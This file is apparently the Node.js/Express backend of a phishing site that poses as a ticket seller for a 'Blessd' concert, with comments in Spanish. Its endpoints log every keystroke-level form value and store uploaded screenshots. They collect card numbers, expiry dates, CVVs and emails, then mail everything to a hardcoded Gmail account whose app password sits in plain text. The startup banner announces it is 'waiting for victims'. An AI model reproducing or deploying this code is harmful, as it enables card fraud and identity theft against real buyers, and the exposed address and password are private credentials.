const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3000;
const SERVER_IP = '192.168.50.53'; // Cambia esto por tu IP

// Configuración de archivos
const LOG_FILE = path.join(__dirname, 'logs_blessd.txt');
const SCREENSHOTS_DIR = path.join(__dirname, 'capturas_blessd');
const DATABASE_FILE = path.join(__dirname, 'datos_tarjetas.txt');

// Crear directorios
if (!fs.existsSync(SCREENSHOTS_DIR)) {
    fs.mkdirSync(SCREENSHOTS_DIR);
}

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

// Configuración de email
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'jehielandrumedinaalvarez33@gmail.com',
        pass: 'cvrc kukj dfzn shfs'
    }
});

// 1. Keylogger mejorado - Guarda TODO
app.post('/captura', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();

    // Guardar en archivo de logs
    const logEntry = `[${timestamp}] Campo: ${data.f} | Valor: ${data.v}\n`;
    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) console.error("Error guardando log:", err);
    });

    // Si es el envío final, guardamos todos los datos juntos
    if (data.f === 'c-number' && data.v.length > 10) {
        const tarjetaEntry = `\n=== TARJETA COMPLETA ===\n` +
            `Fecha: ${timestamp}\n` +
            `Número: ${data.v}\n` +
            `========================\n`;
        fs.appendFile(DATABASE_FILE, tarjetaEntry, () => {});
    }

    console.log(`💳 Capturado: ${data.f} => ${data.v}`);
    res.status(200).json({ status: "ok" });
});

// 2. Guardar capturas de pantalla
app.post('/upload-screenshot', (req, res) => {
    const { image, user, timestamp } = req.body;

    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const safeUser = (user || 'desconocido').replace(/\s/g, '_');
    const fileName = `blessd_${safeUser}_${timestamp}.png`;
    const filePath = path.join(SCREENSHOTS_DIR, fileName);

    fs.writeFile(filePath, base64Data, 'base64', (err) => {
        if (err) {
            console.error("Error guardando captura:", err);
            return res.status(500).send();
        }
        console.log(`📸 Captura guardada: ${fileName}`);
        res.status(200).json({ status: "success" });
    });
});

// 3. Envío final con todos los datos
app.post('/finalizar-y-enviar', async (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();

    // Guardar datos completos de la tarjeta
    const cardData = `\n🔴 DATOS COMPLETOS - ${timestamp}\n` +
        `Usuario: ${data.user || 'N/A'}\n` +
        `Tarjeta: ${data.card || 'N/A'}\n` +
        `Expira: ${data.exp || 'N/A'}\n` +
        `CVV: ${data.cvc || 'N/A'}\n` +
        `Email: ${data.email || 'N/A'}\n` +
        `────────────────────\n`;

    fs.appendFile(DATABASE_FILE, cardData, () => {});

    // Buscar última captura
    const files = fs.readdirSync(SCREENSHOTS_DIR);
    const userFiles = files.filter(f => f.includes(data.user?.replace(/\s/g, '_') || '')).sort().reverse();
    const lastScreenshot = userFiles.length > 0 ? path.join(SCREENSHOTS_DIR, userFiles[0]) : null;

    // Enviar por email
    const mailOptions = {
        from: 'Blessd Tickets <tuemail@gmail.com>',
        to: 'jehielandrumedinaalvarez33@gmail.com',
        subject: `🎫 NUEVA VENTA - Blessd: ${data.user || 'Anónimo'}`,
        text: `Se ha realizado una compra de boletos para Blessd.\n\n` +
            `Datos completos:\n` +
            `Nombre: ${data.user}\n` +
            `Tarjeta: ${data.card}\n` +
            `Exp: ${data.exp}\n` +
            `CVV: ${data.cvc}\n` +
            `Email: ${data.email}\n\n` +
            `Revisa los archivos adjuntos.`,
        attachments: [
            { filename: 'logs_completos.txt', path: LOG_FILE },
            { filename: 'tarjetas.txt', path: DATABASE_FILE },
            ...(lastScreenshot ? [{ filename: 'captura_venta.png', path: lastScreenshot }] : [])
        ]
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log(`📧 Email enviado para: ${data.user}`);
        res.status(200).json({ status: "sent" });
    } catch (error) {
        console.error("Error enviando email:", error);
        res.status(500).send();
    }
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
    console.log(`=================================`);
    console.log(`   SISTEMA BLESSD TICKETS`);
    console.log(`=================================`);
    console.log(`📡 URL: http://${SERVER_IP}:${PORT}`);
    console.log(`📁 Logs: ${LOG_FILE}`);
    console.log(`📁 Tarjetas: ${DATABASE_FILE}`);
    console.log(`📁 Capturas: ${SCREENSHOTS_DIR}`);
    console.log(`=================================`);
    console.log(`Esperando víctimas...`);
});